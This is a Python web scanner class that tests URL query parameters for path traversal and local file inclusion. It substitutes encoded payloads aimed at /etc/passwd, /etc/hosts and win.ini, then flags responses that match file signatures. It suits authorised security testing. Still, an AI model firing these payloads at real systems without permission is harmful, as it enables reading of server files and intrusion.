import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


class PathTraversalTester:
    """
    Advanced tester for detecting possible Path Traversal / LFI vulnerabilities.
    """

    def __init__(self, session=None):
        self.session = session or requests.Session()
        self.vulnerable = []

        # Expanded traversal payloads for Unix & Windows targets
        self.payloads = [
            "../../../../../etc/passwd",
            "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",            # URL-encoded
            "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd", # Double encoded
            "..%255c..%255c..%255c..%255c..%255cwindows%255cwin.ini",
            "../" * 10 + "etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
            "../../../../../etc/hosts%00",  # Null byte attempt
        ]

        # Signatures to detect in response
        self.evidence_signatures = [
            "root:x:0:0",
            "[boot loader]",
            "[fonts]",
            "[extensions]",
            "[drivers]",
        ]

    def extract_params(self, url):
        """
        Extract query parameters to test.
        """
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        return parsed, query_params

    def test_url(self, parsed, params):
        """
        Mutate file path parameters with traversal payloads.
        """
        for param, original_values in params.items():
            for payload in self.payloads:
                new_query = parse_qs(parsed.query)
                new_query[param] = payload
                new_query_encoded = urlencode(new_query, doseq=True)

                new_parsed = parsed._replace(query=new_query_encoded)
                new_url = urlunparse(new_parsed)

                try:
                    resp = self.session.get(new_url, timeout=10)
                    resp_text = resp.text.lower()
                    for signature in self.evidence_signatures:
                        if signature.lower() in resp_text:
                            vuln = {
                                "url": new_url,
                                "param": param,
                                "original_value": original_values[0],
                                "payload": payload,
                                "vuln_type": "Path Traversal / LFI",
                                "severity": "Critical",
                                "evidence": f"Matched signature: '{signature}' | Snippet: {resp.text[:200]}"
                            }
                            self.vulnerable.append(vuln)
                            print(f"[+] Possible Path Traversal: {new_url} (signature: {signature})")
                            break  # No need to check other signatures for this response

                except requests.RequestException as e:
                    print(f"[!] Error testing path traversal at {new_url}: {e}")

    def run(self, url_list):
        """
        Run Path Traversal tests on all given URLs.
        """
        for url in url_list:
            parsed, params = self.extract_params(url)
            if params:
                self.test_url(parsed, params)
        return self.vulnerable
